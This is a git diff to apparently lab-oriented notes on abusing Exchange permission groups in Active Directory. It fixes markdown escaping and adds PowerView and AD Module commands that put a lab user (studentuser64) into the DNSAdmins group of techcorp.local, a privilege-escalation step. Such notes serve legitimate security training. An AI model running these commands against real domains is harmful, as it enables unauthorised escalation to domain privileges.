@@ -21,9 +21,9 @@
 | Organization management | Has Full Control over Exchange Windows Permissions group. <br/><br/>Member of local administrators on exchange servers. | Default Domain Admin user |
 
 Note:
-*Removed in Exchange 2019 CU2 - 'There is a deny ACE on the DNS admins group along with removing the right for Exchange to assign SPNs.'
+\* Removed in Exchange 2019 CU2 - 'There is a deny ACE on the DNS admins group along with removing the right for Exchange to assign SPNs.'
 - https://blogs.technet.microsoft.com/rmilne/2019/06/18/exchange-2019-cu2-released<br/>
-**Removed in Exchange 2019 CU1
+\*\* Removed in Exchange 2019 CU1
 - https://support.microsoft.com/en-us/help/4490059/using-shared-permissions-model-to-run-exchange-server
 
 <br/>
@@ -135,13 +135,29 @@ If we have privileges of '`exchange user`', who is a member of the `Exchange Tru
 - PowerView_dev
 
 ```
+$user = Get-DomainUser -Identity studentuser64
+```
 
+```
+$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain techcorp.local
+```
+
+```
+Add-DomainGroupMember -Identity $group -Members $user -Verbose
 ```
 
 - AD Module
 
 ```
+$user = Get-ADUser -Identity studentuser64
+```
 
+```
+$group = Get-ADGroup -Identity 'DNSAdmins' -Server techcorp.local
+```
+
+```
+Add-ADGroupMember -Identity $group -Members $user -Verbose
 ```
 
 <br/>
